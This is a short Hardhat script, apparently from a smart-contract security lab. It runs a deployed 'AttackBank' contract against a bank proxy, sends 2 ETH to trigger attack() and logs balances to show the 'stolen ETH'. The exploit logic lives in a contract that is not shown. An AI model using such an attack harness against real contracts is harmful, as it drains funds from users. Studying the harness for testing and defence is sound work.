import hardhat from "hardhat";
import config from "./config";

const bankAddress = config.data.proxyAddress;
const maliciousContractAddress = config.data.attackContractAddress;
const contractName = "contracts/AttackBank.sol:AttackBank";

async function main() {
  const signers = await hardhat.ethers.getSigners();
  const signer = signers[2];

  const attackContract = await hardhat.ethers.getContractAt(
    contractName,
    maliciousContractAddress,
    signer
  );

  // Print state before attack
  console.log(
    "My balance before the attack: ",
    await hardhat.ethers.provider.getBalance(signer.address)
  );
  console.log(
    `Bank balance before the attack: ${hardhat.ethers.formatUnits(
      await hardhat.ethers.provider.getBalance(bankAddress)
    )}`
  );

  // Execute the attack and withdraw stolen ETH
  console.log("Executing the attack...");
  await (
    await attackContract.attack({
      value: hardhat.ethers.parseEther("2.0"),
      gasLimit: "0x" + (2000000).toString(16),
    })
  ).wait();

  // Print Summary
  console.log("Attack Done.");
  console.log(
    "My balance after the attack: ",
    await hardhat.ethers.provider.getBalance(signer.address)
  );
}

module.exports = main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
